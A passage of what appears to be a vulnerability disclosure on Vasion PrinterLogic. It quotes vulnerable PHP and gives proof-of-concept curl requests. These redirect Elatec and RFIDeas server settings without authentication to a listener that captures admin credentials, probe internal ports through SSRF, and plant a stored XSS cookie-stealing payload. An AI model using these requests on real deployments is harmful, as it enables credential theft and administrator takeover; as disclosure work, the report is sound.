 <span style="color: #666666">52</span>             <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_client_data=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_client_data</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_ip=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_remote_host</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_remote_port=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_remote_port</span>
 <span style="color: #666666">53</span>             <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_connect=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_connect</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_connect_char=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_connect_char</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_send_connect_char=&quot;</span>
 <span style="color: #666666">54</span>             <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_send_connect_char</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_disconnect_on_given_char=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_discconect_on_given_char</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_disconnect_on_char=&quot;</span>
 <span style="color: #666666">55</span>             <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_disconnect_on_char</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_send_disconnect_char=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_send_disconnect_char</span>
 <span style="color: #666666">56</span>             <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&amp;usb_disconnect_timeout=&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">usb_disconnect_timeout</span>;
 <span style="color: #666666">57</span>         <span style="color: #19177C">$headers</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">58</span>             <span style="color: #BA2121">&quot;POST /cgi-bin/setup_usb.py&quot;</span>,
 <span style="color: #666666">59</span>             <span style="color: #BA2121">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span>,
 <span style="color: #666666">60</span>             <span style="color: #BA2121">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/ /*;q=0.8&quot;</span>,
 <span style="color: #666666">61</span>             <span style="color: #BA2121">&quot;Accept-Encoding: gzip, deflate&quot;</span>,
 <span style="color: #666666">62</span>             <span style="color: #BA2121">&quot;Accept-Language: en-US,en;q=0.8&quot;</span>
 <span style="color: #666666">63</span>         );
 <span style="color: #666666">64</span>         <span style="color: #19177C">$ch</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">65</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">ip_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:81/cgi-bin/setup_usb.py&quot;</span>);
 <span style="color: #666666">66</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_USERPWD, <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">username</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$elatec</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">password</span>);       <span style="color: #408080; font-style: italic">// [4] leak of Elatec credentials</span>
 <span style="color: #666666">67</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 <span style="color: #666666">68</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span>);
 <span style="color: #666666">69</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POSTFIELDS, <span style="color: #19177C">$post_values</span>);
 <span style="color: #666666">70</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$headers</span>);
 <span style="color: #666666">71</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">72</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);                                      <span style="color: #408080; font-style: italic">// [5] Insecure SSL/TLS connection</span>
 <span style="color: #666666">73</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);                                      <span style="color: #408080; font-style: italic">// [6] Insecure SSL/TLS connection</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">100</span>             <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch2</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);                                 <span style="color: #408080; font-style: italic">// [7] Insecure SSL/TLS connection</span>
<span style="color: #666666">101</span>             <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch2</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);                                 <span style="color: #408080; font-style: italic">// [8] Insecure SSL/TLS connection</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">120</span>                 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #008000">json_encode</span>(<span style="color: #19177C">$result</span>);                                                    <span style="color: #408080; font-style: italic">// [9] Output of the SSRF vulnerability</span>
<span style="color: #666666">121</span>             } <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">122</span>                 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$error_result</span>;                                                           <span style="color: #408080; font-style: italic">// [10] Output of the SSRF vulnerability</span>
<span style="color: #666666">123</span>         } <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">124</span>             <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$error_result</span>;                                                               <span style="color: #408080; font-style: italic">// [11] Output of the SSRF vulnerability</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">129</span>     <span style="color: #19177C">$as2</span> <span style="color: #666666">=</span> AccountSetting<span style="color: #666666">::</span><span style="color: #7D9029">updateOrCreate</span>([<span style="color: #BA2121">&#39;setting&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;badge_managment_register_ip&#39;</span>], [<span style="color: #BA2121">&#39;value&#39;</span> <span style="color: #666666">=&gt;</span> requeststr(<span style="color: #BA2121">&#39;ip_address&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>), <span style="color: #BA2121">&#39;secure&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #666666">0</span>]); <span style="color: #408080; font-style: italic">// [12] Change of IP for targeted Elatic device</span>
</pre></div>

<p>Sending a request with a new <code>ip_address</code> value, injecting a custom port without authentication:</p>
<p>HTTP request to change the configuration of Elatec without authentication:</p>
<pre><code>kali% curl -kv "http://10.105.0.241/console_release/fast_release/elatec_tcpconv2.php?printer_id=1&amp;ip_address=10.105.0.239:80/"
</code></pre>
<p>On the remote server (10.105.0.239:80), we can retrieve the login/password.</p>
<p>HTTP request from PrinterLogic containing Elatec credentials:</p>
<pre><code>kali% sudo nc -n -l -v -p 80
listening on [any] 80 ...

connect to [10.105.0.239] from (UNKNOWN) [10.105.0.241] 36012
POST /:81/cgi-bin/setup_usb.py HTTP/1.1
Host: 10.105.0.239
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/ /*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
x-datadog-trace-id: 14656536092520189759
x-datadog-parent-id: 7934684775867635564
Content-Length: 291

usb_newline=crlf&amp;usb_tcp=client&amp;usb_local_port=7777&amp;usb_client_data=plain&amp;usb_ip=10.105.0.241&amp;usb_remote_port=7777&amp;usb_connect=on_any_char&amp;usb_connect_char=&amp;usb_send_connect_char=yes&amp;usb_disconnect_on_given_char=&amp;usb_disconnect_on_char=&amp;usb_send_disconnect_char=yes&amp;usb_disconnect_timeout=10

kali% echo YWRtaW46YWRtaW4=|base64 -d
admin:admin
kali%
</code></pre>
<p>There is also no verification of SSL certificates.</p>
<p>This is also a SSRF, blind by default - This blind SSRF can be transformed into a normal SSRF depending on the HTTP response (line 120, 122 and 124).</p>
<p>The SSRF can be used to reach internal ressources.</p>
<p>It is possible to change the IP of the Elatec server (line 129) to a malicious server without authentication.</p>
<p>The leak of login/password can be used to compromise the Elatec solution, which is used for "Secure Printing using RFID".</p>
<p><a id="va-ssrf-01"></a></p>
<h2>Details - Pre-authenticated SSRF and Change of RFIDeas</h2>
<p>Without authentication, It is possible to remotely change the RFIDeas server (RFIDeas Ethernet 241), used for RFID authentication, to a malicious server.</p>
<p>There is also a Blind SSRF.</p>
<p>Content of <code>/www/app/console_release/fast_release/rfideas_241_install.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> &lt;?php
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
  <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">if</span><span style="color: #666666">(</span> requestint<span style="color: #666666">(</span> <span style="color: #BA2121">&quot;printer_id&quot;</span>, <span style="color: #666666">0</span> <span style="color: #666666">)</span> !<span style="color: #666666">=</span> <span style="color: #666666">0</span> <span style="color: #666666">)</span>
  <span style="color: #666666">8</span> <span style="color: #666666">{</span>
  <span style="color: #666666">9</span>     <span style="color: #19177C">$port</span> <span style="color: #666666">=</span> <span style="color: #666666">23</span>;
 <span style="color: #666666">10</span>     <span style="color: #19177C">$connection</span> <span style="color: #666666">=</span> @fsockopen<span style="color: #666666">(</span> requeststr<span style="color: #666666">(</span> <span style="color: #BA2121">&quot;ip_address&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span> <span style="color: #666666">)</span>, <span style="color: #19177C">$port</span>, <span style="color: #19177C">$errno</span>, <span style="color: #19177C">$errstr</span> <span style="color: #666666">)</span>;
 <span style="color: #666666">11</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>!<span style="color: #19177C">$connection</span><span style="color: #666666">)</span>
 <span style="color: #666666">12</span>     <span style="color: #666666">{</span>
 <span style="color: #666666">13</span>         <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> array<span style="color: #666666">(</span>
 <span style="color: #666666">14</span>             <span style="color: #BA2121">&quot;result&quot;</span>    <span style="color: #666666">=</span>&gt;  <span style="color: #BA2121">&quot;Connection Failed&quot;</span>,
 <span style="color: #666666">15</span>             <span style="color: #BA2121">&quot;errno&quot;</span>     <span style="color: #666666">=</span>&gt;  <span style="color: #19177C">$errno</span>,
 <span style="color: #666666">16</span>             <span style="color: #BA2121">&quot;errstr&quot;</span>    <span style="color: #666666">=</span>&gt;  <span style="color: #19177C">$errstr</span>,
 <span style="color: #666666">17</span>         <span style="color: #666666">)</span>;
 <span style="color: #666666">18</span>         <span style="color: #008000">echo</span> json_encode<span style="color: #666666">(</span> <span style="color: #19177C">$response</span> <span style="color: #666666">)</span>;
 <span style="color: #666666">19</span>     <span style="color: #666666">}</span>
 <span style="color: #666666">20</span>     <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">21</span>     <span style="color: #666666">{</span>
 <span style="color: #666666">22</span>         <span style="color: #19177C">$server_host</span> <span style="color: #666666">=</span> gethostname<span style="color: #666666">()</span>;
 <span style="color: #666666">23</span>         <span style="color: #19177C">$server_ip</span> <span style="color: #666666">=</span> gethostbyname<span style="color: #666666">(</span> <span style="color: #19177C">$server_host</span> <span style="color: #666666">)</span>;
 <span style="color: #666666">24</span>         <span style="color: #19177C">$data_port_fail</span> <span style="color: #666666">=</span> true;
 <span style="color: #666666">25</span>         <span style="color: #19177C">$data_ip_addr</span> <span style="color: #666666">=</span> true;
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
 <span style="color: #666666">72</span>         fwrite<span style="color: #666666">(</span><span style="color: #19177C">$connection</span>, <span style="color: #BA2121">&quot;set init_serv_addr &quot;</span> . <span style="color: #19177C">$server_ip</span> . <span style="color: #BA2121">&quot;\r&quot;</span><span style="color: #666666">)</span>;
 <span style="color: #666666">73</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">(</span>return_output<span style="color: #666666">(</span><span style="color: #19177C">$connection</span><span style="color: #666666">)</span> <span style="color: #666666">===</span> <span style="color: #008000">false</span><span style="color: #666666">)</span>
 <span style="color: #666666">74</span>             <span style="color: #19177C">$init_port_fail</span> <span style="color: #666666">=</span> false;
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
<span style="color: #666666">114</span>         <span style="color: #19177C">$as</span> <span style="color: #666666">=</span> AccountSetting::updateOrCreate<span style="color: #666666">([</span><span style="color: #BA2121">&#39;setting&#39;</span> <span style="color: #666666">=</span>&gt; <span style="color: #BA2121">&#39;badge_managment_register_ip&#39;</span><span style="color: #666666">]</span>, <span style="color: #666666">[</span><span style="color: #BA2121">&#39;value&#39;</span> <span style="color: #666666">=</span>&gt; requeststr<span style="color: #666666">(</span><span style="color: #BA2121">&#39;ip_address&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span><span style="color: #666666">)</span>, <span style="color: #BA2121">&#39;secure&#39;</span> <span style="color: #666666">=</span>&gt; <span style="color: #666666">0])</span>;
<span style="color: #666666">115</span>         <span style="color: #008000">echo</span> json_encode<span style="color: #666666">(</span><span style="color: #19177C">$output</span><span style="color: #666666">)</span>;
</pre></div>

<p>Sending a request with a new <code>$ip_address</code> value (<code>10.105.0.239</code>), injecting a custom port (<code>25</code>), we confirm there is a SSRF:</p>
<pre><code>kali% curl -kv "http://10.105.0.241/console_release/fast_release/rfideas_241_install.php?printer_id=1&amp;ip_address=10.105.0.239:25"
*   Trying 10.105.0.241:80...
* Connected to 10.105.0.241 (10.105.0.241) port 80 (#0)
&gt; GET /console_release/fast_release/rfideas_241_install.php?printer_id=1&amp;ip_address=10.105.0.239:25 HTTP/1.1
&gt; Host: 10.105.0.241
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt;
</code></pre>
<p>On the remote server (10.105.0.239), we get the connection on port 25:</p>
<pre><code>kali% sudo nc -l -n -v -p 25
listening on [any] 25 ...
connect to [10.105.0.239] from (UNKNOWN) [10.105.0.241] 35956
</code></pre>
<p>The SSRF can be used to reach internal ressources.</p>
<p>It is possible to change the IP of the RFIDeas server (line 114) to a malicious server without authentication.</p>
<p><a id="va-stored-xss"></a></p>
<h2>Details - Pre-authenticated Stored XSS in /var/www/app/console_release/fast_release/register_badge.php</h2>
<p>Using the previous vulnerability <a href="#va-pre-auth-password-disclosure">Pre-authentication Elatec password disclosure, Change to a malicious Elatec server and Blind-SSRF</a>, it is possible to get a stored XSS on the <code>$ip_address</code> value in the <code>/www/app/console_release/fast_release/register_badge.php</code> file, without authentication:</p>
<p>Content of <code>/www/app/console_release/fast_release/register_badge.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> 32                     &lt;<span style="color: #008000; font-weight: bold">td</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;3&quot;</span>&gt;
 33                         <span style="color: #BC7A00">&lt;?php</span>
<span style="color: #BC7A00"> 34                         ?&gt;</span>
 35                         An RFIDeas Ethernet 241 or Elatec TCPConv 2 with a badge reader is required for badge registration.
 36                     &lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
 37                 &lt;/<span style="color: #008000; font-weight: bold">tr</span>&gt;
 38                 &lt;<span style="color: #008000; font-weight: bold">tr</span>&gt;
 39                     &lt;<span style="color: #008000; font-weight: bold">td</span>&gt;
 40                         &lt;<span style="color: #008000; font-weight: bold">input</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text&quot;</span> <span style="color: #7D9029">id</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;ip_address&quot;</span> <span style="color: #7D9029">onfocus</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;register_badge_jquery.watermark_focus( &#39;ip_address&#39; );&quot;</span> <span style="color: #7D9029">onblur</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;register_badge_jquery.watermark_blur( &#39;ip_address&#39; );&quot;</span>
 <span style="color: #7D9029">value</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo $ip_address; ?&gt;&quot;</span> /&gt; [1] XSS
 41                     &lt;/<span style="color: #008000; font-weight: bold">td</span>&gt;
 42                     &lt;<span style="color: #008000; font-weight: bold">td</span>&gt;
 43                         &lt;<span style="color: #008000; font-weight: bold">div</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;position: relative; top: -5px; padding-left: 10px;&quot;</span>&gt;
 44                             &lt;<span style="color: #008000; font-weight: bold">a</span> <span style="color: #7D9029">class</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;button&quot;</span> <span style="color: #7D9029">id</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;install_rfid&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;top: 6px; position: relative;&quot;</span> <span style="color: #7D9029">onmousedown</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;register_badge_jquery.install_reader(&#39;rfideas&#39;);&quot;</span>&gt;Configure RFIDeas Ethernet 241&lt;/<span style="color: #008000; font-weight: bold">a</span>&gt;
</pre></div>

<p>Sending a request with a new <code>$ip_address</code> value containing a stored XSS to <code>/console_release/fast_release/elatec_tcpconv2.php</code>:</p>
<pre><code>kali% curl -kv 'http://10.105.0.241/console_release/fast_release/elatec_tcpconv2.php?printer_id=1&amp;ip_address="&gt;&lt;script&gt;alert(window.cookie)&lt;/script&gt;'
{"result":"Error: Could not resolve host: \"&gt;&lt;script&gt;alert(window.cookie)&lt;"}
</code></pre>
<p>There is now a stored XSS in <code>http://10.105.0.241/console_release/fast_release/register_badge.php</code>:</p>
<p><img alt="" src="images/2025-vasion-report-1-xss-01.png" />
http://10.105.0.241/console_release/fast_release/register_badge.php</p>
<p>The stored XSS can be used to steal cookies of administrators and get administrator access to the solution. This attack doesn't require authentication.</p>
<p><a id="va-ssrf-02"></a></p>
<h2>Details - SSRF everywhere in /var/www/app and compromise of the SaaS infrastructure</h2>
<p>When analyzing the PHP files in <code>/opt/www/app</code>, it appears a large number of SSRF vulnerabilities exist. They mainly can be exploited by administrators by providing wrong hostname/ip for printers. They are 42 calls to <code>curl_setopt(.., CURLOPT_URL, ..)</code>:</p>
<pre><code>kali% rgrep CURLOPT_URL .
./app/Console/Commands/XeroxSoapClient.php:        curl_setopt($ch, CURLOPT_URL, $url);
./app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_URL, $xrxUrl );
./app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_URL, $xrxUrl );
./app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_URL, $xrxUrl);
./app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_URL, $xrxUrl );
./app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_URL, $url);
./app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_URL, $xrxUrl);
./app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_URL, $xrxUrl);
./app/Helpers/HPSoapHelper.php:        curl_setopt($ch, CURLOPT_URL, $sendUrl);
./lib/common/aws/lib/requestcore/requestcore.class.php:         curl_setopt($curl_handle, CURLOPT_URL, $this-&gt;request_url);
./console_release/xerox/xerox_auth_soap_server_0.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/xerox/xerox_auth_soap_server_0.php:        curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/xerox/installApp.php:    curl_setopt($ch, CURLOPT_URL, $url);
./console_release/xerox/removeApp.php:        curl_setopt($ch, CURLOPT_URL, $url);
./console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_URL, $XRX_URL );
./console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_URL, $XRX_URL );
./console_release/xerox/xerox_soap_helper.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_URL, $XRX_URL );
./console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/common/cpa_helper_functions.php:    curl_setopt( $ch, CURLOPT_URL, $url );
./console_release/hp/installApp.php:    curl_setopt($ch, CURLOPT_URL, $url);
./console_release/hp/hp_soap_helper.php:                curl_setopt($ch, CURLOPT_URL, $sendUrl);
./console_release/lexmark/update.php:            curl_setopt($ch, CURLOPT_URL, 'ftp://' . $this_vo-&gt;str_host_address . '/printerlogic.fls');
./console_release/lexmark/update.php:        curl_setopt($ch, CURLOPT_URL, 'ftp://' . $this_vo-&gt;str_host_address . '/printerlogic.ucf');
./console_release/lexmark/installSettings.php:        curl_setopt($ch, CURLOPT_URL, 'ftp://' . $printer_vo-&gt;str_host_address . '/printerlogic.ucf');
./console_release/lexmark/installApp.php:curl_setopt( $ch, CURLOPT_URL, 'ftp://' . $printer_vo-&gt;str_host_address . '/printerlogic.fls' );
./console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch_check, CURLOPT_URL, "http://" . $elatec-&gt;ip_address . ":81/pages/setup_usb.php");
./console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch, CURLOPT_URL, "http://" . $elatec-&gt;ip_address . ":81/cgi-bin/setup_usb.py");
./console_release/fast_release/elatec_tcpconv2.php:            curl_setopt($ch2, CURLOPT_URL, "http://" . $elatec-&gt;ip_address . ":81/cgi-bin/reboot.py");
./console_release/samsung/samsung_rest_helper.php:  curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./console_release/samsung/list_apps.php:  curl_setopt( $ch, CURLOPT_URL, "http://" . $printer_vo-&gt;str_host_address . "/era/applications" );
./console_release/samsung/list_apps.php:    curl_setopt( $ch_app, CURLOPT_URL, "http://" . $printer_vo-&gt;str_host_address . "/era/applications/" . $attributes["ID"] );
./console_release/samsung/get_device_info.php:  curl_setopt( $ch, CURLOPT_URL, "http://" . $printer_vo-&gt;str_host_address . ":8080/ws/v1/tokenmgt/tokenmanager/createtoken" );
./console_release/samsung/remove_app.php:       curl_setopt($ch, CURLOPT_URL, "http://" . $printer_vo-&gt;str_host_address . "/era/applications");
./console_release/samsung/remove_app.php:               curl_setopt($ch_app, CURLOPT_URL,
./console_release/samsung/remove_app.php:                       curl_setopt($ch_del, CURLOPT_URL,
./console_release/km/konicaminolta_soap_helper.php:             curl_setopt($ch,CURLOPT_URL,$url);
./console_release/km/konicaminolta_soap_helper.php:             curl_setopt($ch, CURLOPT_URL, $url);
./console_release/km/konicaminolta_soap_helper.php:             curl_setopt($ch, CURLOPT_URL, $url);
./console_release/km/konicaminolta_soap_helper.php:             curl_setopt($ch, CURLOPT_URL, $url);
./console_release/km/konicaminolta_soap_helper.php:             curl_setopt($ch, CURLOPT_URL, $url);
kali%
</code></pre>
<p>For example, in the file <code>/var/ww/app/console_release/xerox/removeApp.php</code>, a HTTPS request will be sent to <code>$url</code>. The variable <code>$url</code> is made of <code>https://" . $printer_vo-&gt;str_host_address . "/webservices/office/device_configuration/1</code>.</p>
<p>If <code>$url</code> contains a custom domain name or a custom ip followed by a <code>/?</code>, then a HTTPS request will be sent to this domain name or a custom ip. For example, a printer set to <code>test.com/?</code> will provide a specific value for <code>$url</code>: <code>https://test.com/?/webservices/office/device_configuration/1</code>. The resulting request will be sent to <code>test.com:443</code>.</p>
<p>Content of <code>/var/ww/app/console_release/xerox/removeApp.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">26</span> <span style="color: #008000; font-weight: bold">if</span>( requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> ) <span style="color: #666666">!=</span> <span style="color: #666666">0</span> )
 <span style="color: #666666">27</span> {
 <span style="color: #666666">28</span>     <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> );
[<span style="color: #666666">...</span>]
 <span style="color: #666666">51</span>         <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;https://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/webservices/office/device_configuration/1&quot;</span>;
[<span style="color: #666666">...</span>]
 <span style="color: #666666">54</span>         <span style="color: #19177C">$ch</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">55</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #19177C">$url</span>);
 <span style="color: #666666">56</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span>);
 <span style="color: #666666">57</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POSTFIELDS, <span style="color: #19177C">$xml</span>);
 <span style="color: #666666">58</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$headers</span>);
 <span style="color: #666666">59</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">60</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">61</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">62</span>         <span style="color: #19177C">$version_response</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">63</span>         <span style="color: #008000; font-weight: bold">try</span>
 <span style="color: #666666">64</span>         {
 <span style="color: #666666">65</span>             <span style="color: #19177C">$version_response</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_exec</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">66</span>             <span style="color: #19177C">$version_error</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_error</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">67</span>             <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$version_error</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&quot;&quot;</span>)
</pre></div>

<p>The second example is available in <code>/var/www/app/console_release/samsung/get_device_info.php</code>.</p>
<p>Content of <code>www/app/console_release/samsung/get_device_info.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">if</span>( requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> ) <span style="color: #666666">!=</span> <span style="color: #666666">0</span> )
 <span style="color: #666666">12</span> {
 <span style="color: #666666">13</span>   <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> );
[<span style="color: #666666">...</span>]
 <span style="color: #666666">35</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$header</span> );
